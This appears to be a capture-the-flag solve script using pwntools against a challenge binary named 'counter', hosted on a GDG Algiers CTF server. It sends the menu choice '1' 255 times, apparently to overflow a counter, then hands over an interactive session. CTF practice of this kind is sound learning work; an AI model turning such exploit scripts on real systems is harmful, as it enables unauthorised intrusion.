#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('counter', checksec=0)
# libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('pwn.chal.ctf.gdgalgiers.com', 1402)
else:
  p = binary.process(env={})

sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

pause()
for i in range(0, 255, 1):
  log.info("%d"%i)
  sl(b'1', b'Choice: ')
p.interactive()

